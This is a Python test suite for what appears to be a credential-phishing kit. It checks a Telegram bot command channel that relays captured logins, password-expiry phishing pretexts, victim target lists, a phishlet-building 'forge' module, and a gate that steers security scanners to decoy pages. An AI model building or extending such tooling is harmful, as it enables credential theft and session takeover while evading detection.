"""Control-channel hardening: token handling, the request path, injection, the
gate, and the forge/pretext/target layers.

Every test here runs against an injected transport or a local stub - no real
network is touched - and pins one concrete defect that was reproduced before the
fix:

  * the bot token leaking through an exception/log/repr;
  * a persistent transport failure spinning the poll loop (~550k requests in
    0.5s) and a truncated JSON body counting as a delivered message;
  * a 429/5xx/timeout/DNS not being retried, a permanent 4xx being retried;
  * a captured value breaking the message (markup, or a callback_data over
    Telegram's 64-byte limit);
  * the gate crashing on a malformed intel payload or a non-string country list;
  * a partial pretext / a non-mapping target row / a partial analysis raising a
    KeyError or TypeError in the middle of an engagement.

Run:  ./.venv/bin/python -m pytest tests/test_control_channel_hardening.py -v
"""
import http.client
import json
import os
import sys
import threading
import time
import urllib.error

import pytest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core import (
    alerts,  # noqa: E402
    forge,  # noqa: E402
    net,  # noqa: E402
)
from core import pretexts as P  # noqa: E402
from core import targets as T  # noqa: E402
from core import telegram as tg  # noqa: E402
from core.gate import Gate  # noqa: E402

pytestmark = pytest.mark.unit

TOKEN = "123456789:AAExampleSecretTokenValue"


class Recorder:
    """A stand-in transport: records calls, replies ok."""

    def __init__(self, fail=False):
        self.calls = []
        self.fail = fail

    def __call__(self, url, payload, timeout=10):
        self.calls.append({"url": url, "payload": dict(payload or {})})
        if self.fail:
            raise OSError("network down")
        return {"ok": True, "result": {"message_id": 1}}

    def texts(self):
        return [c["payload"].get("text") for c in self.calls
                if c["url"].endswith("sendMessage")]


# ============================================================ token handling ==
class TestTokenHandling:
    def test_the_real_urllib_leak_exists_and_is_redacted(self):
        """http.client raises InvalidURL carrying the token when it lands in the
        URL authority (a mis-set telegram_api_base). The authority splits at the
        colon, so the SECRET half leaks - prove it, then prove redact() scrubs
        both the whole token and that half."""
        secret = TOKEN.split(":", 1)[1]
        try:
            net.post_json(f"https://bot{TOKEN}/getUpdates", {"a": 1}, timeout=1)
            leaked = ""
        except Exception as e:
            leaked = str(e)
        assert secret in leaked, "the leak this guards against must still be real"
        scrubbed = tg.redact(leaked, TOKEN)
        assert secret not in scrubbed and TOKEN not in scrubbed
        assert "bot<redacted>" in scrubbed

    def test_a_transport_error_carrying_the_token_is_redacted_in_the_log(self):
        logged = []

        def leaky(url, payload, timeout=10):
            raise http.client.InvalidURL(f"nonnumeric port: '{TOKEN}'")

        c2 = tg.C2(TOKEN, "42", transport=leaky, logger=logged.append, retries=0)
        c2.send("hi")
        joined = " ".join(logged)
        assert logged and TOKEN not in joined and "bot<redacted>" in joined

    def test_a_command_error_carrying_the_token_is_redacted_in_the_reply(self):
        c2 = tg.C2(TOKEN, "42", transport=Recorder(), retries=0)

        def boom(_args):
            raise ValueError(f"could not reach https://api.telegram.org/bot{TOKEN}/x")

        c2.register("boom", boom)
        out = c2.dispatch("42", "/boom")
        assert out and TOKEN not in out and "bot<redacted>" in out

    def test_repr_never_shows_the_token(self):
        c2 = tg.C2(TOKEN, "42")
        assert TOKEN not in repr(c2)
        assert "bot<redacted>" in repr(c2)


# ============================================================== request path ==
class TestRequestPath:
    def test_a_transient_failure_is_retried_then_succeeds(self):
        seq = {"n": 0}

        def flaky(url, payload, timeout=10):
            seq["n"] += 1
            if seq["n"] < 3:
                raise OSError("blip")
            return {"ok": True, "result": {"message_id": 1}}

        c2 = tg.C2("T", "42", transport=flaky, retries=2, retry_base=0)
        assert c2.send("hi") == 1
        assert seq["n"] == 3

    def test_a_429_is_retried(self):
        seq = {"n": 0}

        def limited(url, payload, timeout=10):
            seq["n"] += 1
            raise urllib.error.HTTPError(url, 429, "Too Many Requests", {}, None)

        c2 = tg.C2("T", "42", transport=limited, retries=2, retry_base=0)
        c2.send("hi")
        assert seq["n"] == 3

    def test_a_permanent_4xx_is_not_retried(self):
        seq = {"n": 0}

        def denied(url, payload, timeout=10):
            seq["n"] += 1
            raise urllib.error.HTTPError(url, 403, "Forbidden", {}, None)

        c2 = tg.C2("T", "42", transport=denied, retries=3, retry_base=0)
        assert c2.send("hi") == 0
        assert seq["n"] == 1

    def test_backoff_honours_retry_after(self):
        exc = urllib.error.HTTPError("http://x", 429, "too many",
                                     {"Retry-After": "7"}, None)
        assert tg.C2("T", "42")._backoff(0, exc) == 7.0

    def test_retryable_classifies_transient_vs_permanent(self):
        assert tg.C2._retryable(urllib.error.HTTPError("u", 429, "m", {}, None))
        assert tg.C2._retryable(urllib.error.HTTPError("u", 503, "m", {}, None))
        assert not tg.C2._retryable(urllib.error.HTTPError("u", 400, "m", {}, None))
        assert not tg.C2._retryable(urllib.error.HTTPError("u", 401, "m", {}, None))
        assert tg.C2._retryable(OSError("dns"))

    def test_a_failed_poll_backs_off_instead_of_spinning(self):
        """Before the fix: ~550k getUpdates attempts in 0.5s with no backoff."""
        calls = {"n": 0}

        def failing(url, payload, timeout=10):
            calls["n"] += 1
            raise OSError("down")

        c2 = tg.C2("T", "42", transport=failing, retries=0)
        th = threading.Thread(target=c2.run_forever,
                              kwargs={"poll_timeout": 0, "on_error_sleep": 0.2},
                              daemon=True)
        th.start()
        time.sleep(0.6)
        c2.stop()
        th.join(timeout=3)
        assert calls["n"] >= 1
        assert calls["n"] <= 8, f"the loop spun: {calls['n']} attempts in 0.6s"

    def test_a_truncated_body_is_a_clean_failure(self, monkeypatch):
        monkeypatch.setattr(net, "post_json",
                            lambda url, payload, timeout=8, **kw:
                            (200, b'{"ok":true,"result":'))
        out = tg._default_transport("http://x/getUpdates", {})
        assert out["ok"] is False and "200" in out["description"]

    def test_an_unreadable_reply_is_not_counted_as_sent(self):
        c2 = tg.C2("T", "42", retries=0,
                   transport=lambda u, p, timeout=10:
                   {"ok": False, "description": "unreadable reply (HTTP 200)"})
        assert c2.send("hello") == 0

    def test_a_dns_failure_ends_as_a_clean_none(self):
        c2 = tg.C2("T", "42", retries=1, retry_base=0,
                   transport=lambda u, p, timeout=10: (_ for _ in ()).throw(
                       urllib.error.URLError("Name or service not known")))
        assert c2.send("hello") == 0


# ================================================================ injection ==
class TestMessageInjection:
    def test_a_captured_value_with_markup_survives_verbatim(self):
        text = alerts.format_capture({
            "ts": 1, "is_cred": True, "ip": "1.2.3.4",
            "fields": {"email": "a<b>*c*@x.test", "password": "p*w<1>\nsecond line"}})
        rec = Recorder()
        tg.C2("T", "42", transport=rec).send(text)
        sent = "".join(rec.texts())
        assert "a<b>*c*@x.test" in sent and "p*w<1>" in sent
        # no parse_mode is set, so '<' and '*' are literal - nothing to break
        assert all("parse_mode" not in c["payload"] for c in rec.calls)

    def test_a_long_callback_is_capped_to_telegrams_limit(self):
        rec = Recorder()
        tg.C2("T", "42", transport=rec).send(
            "hi", buttons=[[("Go", "/takeover " + "x" * 200)]])
        cb = rec.calls[0]["payload"]["reply_markup"]["inline_keyboard"][0][0]["callback_data"]
        assert len(cb.encode("utf-8")) <= tg.MAX_CALLBACK

    def test_a_short_callback_is_untouched(self):
        rec = Recorder()
        tg.C2("T", "42", transport=rec).send("hi", buttons=[[("Go", "/stats")]])
        cb = rec.calls[0]["payload"]["reply_markup"]["inline_keyboard"][0][0]["callback_data"]
        assert cb == "/stats"


# ===================================================================== gate ==
class TestGateHardening:
    def test_bot_check_tolerates_a_non_dict_intel(self):
        g = Gate(bot_threshold=60)
        for bad in ("nope", True, 5, ["x"]):
            action, score, _ = g.bot_check(ua="curl/8.4.0", intel=bad)
            assert action == "decoy", bad

    def test_country_lists_tolerate_non_string_entries(self):
        g = Gate(allow_countries=[1, None, "in", "  "])
        assert g.check(country="IN")[0] is True
        assert g.check(country="US")[0] is False

    def test_an_empty_or_missing_value_cannot_bypass_the_gate(self):
        g = Gate(allow_asn=["15169"])
        assert g.check(asn="")[0] is False
        assert g.check(asn=None)[0] is False
        assert g.check(asn="not-an-asn")[0] is False
        gc = Gate(allow_countries=["IN"])
        assert gc.check(country=None)[0] is False
        assert gc.check(country="")[0] is False

    def test_an_empty_user_agent_is_refused(self):
        g = Gate(bot_threshold=60)
        assert g.bot_check(ua="")[0] == "decoy"
        assert g.bot_check(ua=None)[0] == "decoy"

    def test_unicode_values_do_not_crash_the_gate(self):
        g = Gate(block_countries=["RU"], max_hits_per_ip=2)
        assert g.check(country="Россия", ip="1.2.3.4")[0] is True
        assert g.check(country="RU", ip="1.2.3.4")[0] is False

    def test_device_capped_tolerates_a_non_numeric_count(self):
        g = Gate(max_hits_per_device=2)
        over, count = g.device_capped("dev-1", extra="junk")
        assert over is False and count == 0

    def test_gate_decisions_are_deterministic(self):
        g = Gate(block_countries=["RU"], block_asn=["15169"], bot_threshold=60)
        assert {g.bot_check(ua="masscan/1.3")[0] for _ in range(5)} == {"decoy"}
        assert len({g.check(country="RU", asn="15169") for _ in range(5)}) == 1


# ================================================================= pretexts ==
class TestPretextHardening:
    def test_load_dir_skips_a_partial_new_pretext(self, tmp_path, capsys):
        (tmp_path / "p.json").write_text(json.dumps({
            "brand_new": {"subject": "S", "body": "B {{Phish_URL}}"}}), encoding="utf-8")
        loaded = P.load_dir(str(tmp_path))
        assert "brand_new" not in loaded
        assert "brand_new" not in P.names()
        assert "skipped" in capsys.readouterr().out

    def test_load_dir_merges_a_partial_override_of_a_builtin(self, tmp_path):
        orig = dict(P.PRETEXTS["it_password_expiry"])
        (tmp_path / "o.json").write_text(json.dumps({
            "it_password_expiry": {"subject": "New subject"}}), encoding="utf-8")
        try:
            assert "it_password_expiry" in P.load_dir(str(tmp_path))
            p = P.get("it_password_expiry")
            assert p["subject"] == "New subject"
            assert p["body"] == orig["body"]          # the rest is kept
            assert P.missing_fields("it_password_expiry", {}) == orig["fields"]
        finally:
            P.PRETEXTS["it_password_expiry"] = orig

    def test_accessors_survive_a_partial_pretext(self):
        P.PRETEXTS["_partial_test"] = {"subject": "S", "body": "B"}
        try:
            assert P.render("_partial_test", {"x": 1}) == ("S", "B")
            assert P.missing_fields("_partial_test", {}) == []
            assert P.second_ask("_partial_test") == ""
            assert "tell" in P.describe("_partial_test")
        finally:
            P.PRETEXTS.pop("_partial_test", None)

    def test_a_non_dict_context_does_not_crash(self):
        assert P.render("it_password_expiry", ["not", "a", "dict"])[0]
        assert P.missing_fields("it_password_expiry", "x") == \
            P.PRETEXTS["it_password_expiry"]["fields"]
        assert P.second_ask("it_password_expiry", "x")


# ================================================================== targets ==
class TestTargetHardening:
    def test_targets_skips_non_mapping_rows(self):
        store = T.Targets([{"email": "a@b.test"}, "nonsense", 5, None,
                           {"email": "c@d.test"}])
        assert len(store) == 2 and store.emails() == ["a@b.test", "c@d.test"]

    def test_a_json_object_where_a_list_is_expected_is_empty(self, tmp_path):
        p = tmp_path / "t.json"
        p.write_text(json.dumps({"targets": {"email": "a@b.test"}}), encoding="utf-8")
        assert len(T.load(str(p))) == 0

    def test_prefill_escapes_a_quote_in_the_address(self):
        page = '<input name="email" type="email">'
        out = T.prefill_html(page, T.Target(email='x" onmouseover="alert(1)'))
        assert 'value="x&quot; onmouseover=&quot;alert(1)"' in out
        assert 'onmouseover="alert(1)"' not in out

    def test_prefill_with_a_non_string_field_does_not_crash(self):
        page = '<input name="email" type="email">'
        assert T.prefill_html(page, T.Target(email="a@b.test"), field=123) == page

    def test_identity_fields_ignores_a_non_text_body(self):
        assert T.identity_fields(b'<input name="email">') == []
        assert T.identity_fields(None) == []


# ==================================================================== forge ==
class TestForgeHardening:
    def test_report_renders_a_partial_analysis(self):
        text = forge.report({"proxy_hosts": [{"domain": "x.test"}],
                             "credentials": {"username": {}}})
        assert "x.test" in text and "username" in text

    def test_report_does_not_raise_on_garbage(self):
        assert forge.report({})
        assert forge.report(None)
        assert forge.report({"confidence": "not-a-dict", "proxy_hosts": ["x"]})

    def test_to_phishlet_survives_a_partial_analysis(self):
        ph = forge.to_phishlet({"credentials": {"username": {"key": "login"}},
                                "proxy_hosts": [{"domain": "x.test"}]})
        assert ph.credentials["username"].key == "login"

    def test_to_phishlet_on_empty_is_not_a_crash(self):
        assert forge.to_phishlet({}) is not None

    def test_rank_tokens_tolerates_none(self):
        assert forge.rank_tokens(None) == ([], [])

    def test_snapshot_mode_tolerates_a_string_headers_entry(self):
        snap = {"/login": {"status": 200, "body": "<form><input name='email'></form>",
                           "headers": "Set-Cookie: sess=1"}}
        a = forge.forge("https://example.test/login", snapshot=snap)
        assert a["status"] == 200

    def test_a_bad_url_is_still_refused(self):
        for bad in ("", "not-a-url", "ftp://x.test/"):
            with pytest.raises(ValueError):
                forge.forge(bad)


# =================================================================== alerts ==
class TestAlertHardening:
    def test_safe_redacts_the_token(self, capsys):
        def boom(_c):
            raise RuntimeError(f"POST https://api.telegram.org/bot{TOKEN}/sendMessage failed")
        alerts._safe(boom, {}, TOKEN)
        out = capsys.readouterr().out
        assert TOKEN not in out and "bot<redacted>" in out

    def test_format_capture_survives_a_malformed_capture(self):
        text = alerts.format_capture({"ts": "not-a-time", "risk": "high",
                                      "fields": [], "risk_reasons": {"a": 1}})
        assert "captured" in text

    def test_format_chain_survives_a_non_list_field(self):
        text = alerts.format_chain({"chain": "own", "tasks": {"t": 1}, "findings": {},
                                    "errors": "oops", "sid": "s"})
        assert "CHAIN own" in text

    def test_token_tier_line_survives_non_dict_rows(self):
        text = alerts._token_tier_line({"token_intel": {
            "tier0": ["x", None, {"path": "p", "verdict": "open"}]}})
        assert "p" in text

    def test_send_telegram_retries_a_transient_failure(self, monkeypatch):
        seq = {"n": 0}

        def flaky(url, payload, timeout=8):
            seq["n"] += 1
            if seq["n"] < 3:
                raise OSError("blip")
            return (200, b'{"ok":true}')

        monkeypatch.setattr(alerts, "_post_json", flaky)
        alerts.send_telegram("T", "42", "hi", retries=2, retry_base=0)
        assert seq["n"] == 3

    def test_send_telegram_does_not_retry_a_permanent_error(self, monkeypatch):
        seq = {"n": 0}

        def denied(url, payload, timeout=8):
            seq["n"] += 1
            raise urllib.error.HTTPError(url, 403, "Forbidden", {}, None)

        monkeypatch.setattr(alerts, "_post_json", denied)
        with pytest.raises(urllib.error.HTTPError):
            alerts.send_telegram("T", "42", "hi", retries=3, retry_base=0)
        assert seq["n"] == 1

    def test_send_telegram_caps_the_callback(self, monkeypatch):
        seen = {}

        def cap(url, payload, timeout=8):
            seen.update(payload)
            return (200, b'{"ok":true}')

        monkeypatch.setattr(alerts, "_post_json", cap)
        alerts.send_telegram("T", "42", "hi", buttons=[[("Go", "/x " + "y" * 200)]])
        cb = seen["reply_markup"]["inline_keyboard"][0][0]["callback_data"]
        assert len(cb.encode("utf-8")) <= tg.MAX_CALLBACK
